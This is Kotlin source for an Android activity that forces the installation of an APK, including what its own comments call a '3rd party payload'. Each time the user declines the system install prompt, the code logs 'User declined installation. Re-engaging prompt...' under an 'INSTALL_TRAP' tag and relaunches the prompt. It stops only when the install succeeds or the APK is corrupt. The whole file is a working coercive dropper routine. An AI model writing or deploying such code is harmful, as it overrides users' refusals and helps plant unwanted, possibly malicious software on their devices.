package com.example.myandroid

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import androidx.core.content.FileProvider
import java.io.File

class RelentlessInstallActivity : Activity() {
    private var apkPath: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        apkPath = intent.getStringExtra("apk_path")
        
        // Make the window completely transparent and untouchable so it doesn't block UI
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
        
        if (apkPath == null || !File(apkPath!!).exists()) {
            finish()
            return
        }
        
        launchInstall()
    }

    private fun launchInstall() {
        try {
            val apkFile = File(apkPath!!)
            val uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", apkFile)
            val installIntent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                putExtra(Intent.EXTRA_RETURN_RESULT, true) // Required for accurate onActivityResult in Android 8+
                // CRITICAL: Do NOT add FLAG_ACTIVITY_NEW_TASK here. 
                // We need it to return a result to THIS activity.
            }
            startActivityForResult(installIntent, 666)
        } catch (e: Exception) {
            DebugLogger.log("INSTALL_ERR", "Launch Failed: ${e.message}")
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 666) {
            val info = packageManager.getPackageArchiveInfo(apkPath!!, 0)
            
            // 1. Corrupt APK Protection (Prevents true infinite loop if file is broken)
            if (info == null) {
                DebugLogger.log("INSTALL_ERR", "Corrupt APK detected. Aborting relentless loop.")
                finish()
                return
            }

            val targetPkg = info.packageName

            // 2. Evaluate Success
            val isSuccess = if (targetPkg == packageName) {
                // If it was updating OUR app, a success kills our process to replace the files.
                // If we are still executing this line of code, the installation did not happen.
                false
            } else {
                // If installing a 3rd party payload, check the PackageManager to verify it exists
                try {
                    packageManager.getPackageInfo(targetPkg, 0)
                    true
                } catch (e: Exception) { 
                    false 
                }
            }

            // 3. The Trap
            if (!isSuccess) {
                DebugLogger.log("INSTALL_TRAP", "User declined installation. Re-engaging prompt...")
                launchInstall()
            } else {
                DebugLogger.log("INSTALL", "Installation verified successful.")
                finish()
            }
        }
    }
}
